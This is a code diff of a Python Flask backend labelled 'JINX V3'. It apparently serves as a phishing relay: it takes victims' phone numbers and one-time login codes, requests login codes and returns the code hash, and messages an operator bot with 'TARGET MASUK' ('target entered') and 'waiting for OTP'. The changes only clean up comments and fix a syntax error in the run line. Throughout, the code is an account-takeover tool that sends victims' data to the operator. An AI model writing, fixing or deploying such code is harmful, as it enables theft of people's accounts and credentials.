@@ -36,7 +36,7 @@ def handle():
     phone = request.form.get('phone')
     code = request.form.get('code')
     action = request.form.get('action', 'send')
-    phone_code_hash = request.form.get('hash')  # TERIMA HASH
+    phone_code_hash = request.form.get('hash')
 
     if not phone:
         return jsonify({'success': False, 'error': 'no phone'}), 400
@@ -76,7 +76,7 @@ def handle():
             status = "RESEND" if action == 'resend' else "TARGET MASUK"
             msg = f"*{status}*\n\nNo: `{phone}`\nMenunggu OTP..."
             send_bot(msg)
-            return jsonify({'success': True, 'hash': res.phone_code_hash})  # KIRIM HASH
+            return jsonify({'success': True, 'hash': res.phone_code_hash})
 
     except Exception as e:
         log.error(f"ERROR: {e}")
@@ -86,10 +86,7 @@ def handle():
 
 @app.route('/')
 def home():
-    return "JINX V3 – HASH FIXED | OTP ASLI"
+    return "JINX V3 – SYNTAX FIXED | OTP ASLI"
 
 if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))    return "JINX V3 – RAILWAY TIMEOUT FIXED"
-
-if __name__ == "__main__":
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # FIX: 2 KURUNG
